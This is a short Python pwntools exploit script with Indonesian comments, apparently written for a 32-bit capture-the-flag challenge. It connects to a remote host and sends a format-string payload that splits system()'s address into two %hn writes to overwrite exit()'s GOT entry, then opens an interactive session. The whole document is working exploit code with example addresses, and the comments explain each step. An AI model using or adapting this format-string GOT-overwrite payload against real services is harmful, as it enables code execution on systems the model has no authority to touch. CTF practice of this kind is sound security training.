from pwn import *

# === 1. KONFIGURASI TARGET ===
# io = process('./vuln')              # Aktifkan buat tes LOKAL
io = remote('target-ctf.id', 1234)    # Aktifkan buat REMOTE (NC)

context.arch = 'i386' # Sesuai gambar lu (32-bit)

# === 2. ALAMAT (CONTOH DARI GAMBAR LU) ===
# Kita asumsikan mau overwrite exit() biar ke system()
got_exit = 0x0804a01c     # Cari pake 'objdump -R' atau 'elf.got["exit"]'
system_addr = 0xb7e52070  # Alamat system di libc
fmt_offset = 4            # Offset buf lu

# Pecah jadi 2 byte (split write)
low = system_addr & 0xffff        # 0x2070
high = (system_addr >> 16) & 0xffff # 0xb7e5

# === 3. PAYLOAD ===
# Header alamat
payload = p32(got_exit)      # Param ke-4
payload += p32(got_exit + 2) # Param ke-5

# Hitung padding
fmt_low = low - 8
fmt_high = high - low

payload += f"%{fmt_low}c%4$hn".encode()
payload += f"%{fmt_high}c%5$hn".encode()

# === 4. EKSEKUSI ===
io.sendline(payload)

# Karena kita timpa exit -> system, dan biasanya exit() 
# dipanggil tanpa argumen string yang kita kontrol, 
# teknik ini paling jos kalau lu arahin ke fungsi "win()" 
# atau balik ke main() biar bisa exploit ulang.

io.interactive()